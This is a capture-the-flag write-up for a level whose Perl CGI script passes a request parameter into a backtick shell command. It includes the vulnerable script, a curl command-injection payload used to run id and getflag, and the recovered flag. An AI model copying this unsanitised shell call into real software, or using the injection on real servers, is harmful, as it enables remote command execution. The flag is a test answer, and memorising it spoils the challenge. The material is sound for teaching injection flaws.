
# Perl CGI Vuln
We have a perl script that serves as an endpoint for the **CGI**.

  
CGI is a protocol that allows a web server to execute scripts or programs to generate dynamic content in response to HTTP requests, the Perl language, particularly suitable for manipulating strings is used here.

This technology were popular in the early days of the web to create dynamic pages, but over time, other technologies such as server-side programming languages (such as PHP, Python, Ruby, etc.).

Here we have a simple illustration of its process.

![enter image description here](https://i.imgur.com/BNxY1vP.gif)

```perl
#!/usr/bin/perl
# localhost:4747

use CGI qw{param};
# This line imports the 'param' function from the CGI module,
# which will be used to retrieve parameters from HTTP requests.

print "Content-type: text/html\n\n";
# This line prints the HTTP header indicating that the response content will be in HTML format.
# The double newline indicates the end of the header.

sub x
{
  $y = $_[0];
  # Assign the value of the first argument passed to the function to the variable $y.
  
  print `echo $y 2>&1`;
  # Execute the 'echo' shell command with the value of $y as an argument.
  # The backticks capture the command's output & apply a command substitution.
  # The '2>&1' redirects the stderr (fd 2)
  # to stdout (fd 1), so errors are also captured.
}

x(param("x"));
# Call the function 'x' and pass the value of the "x"
# parameter from the HTTP request as an argument.

```

We note that at the top of the file we have "**localhost:4747**", let’s check a listening service on this port with **`netstat -tuln`**.

    tcp6 0 0::4747   :::*   LISTEN

Indeed we can see a listening on this port, so we’ll probably be able to send http requests.

The line that makes a print is vulnerable, we can inject a substitution command.
However you must first verify that this shell is executed as **flag04**, to do so we will send the **`id`** command.

```bash 
curl 'localhost:4747?x=`[CMDLINE]`' # id
```

    uid=3004(flag04) gid=2004(level04) groups=3004(flag04),1001(flag),2004(level04)


It is confirmed it is the user **flag04** that execute, in this case we will simply return a request by replacing the program id by **`getflag`** and voila.

> Flag : `ne2searoevaevoem4ov4ar8ap`
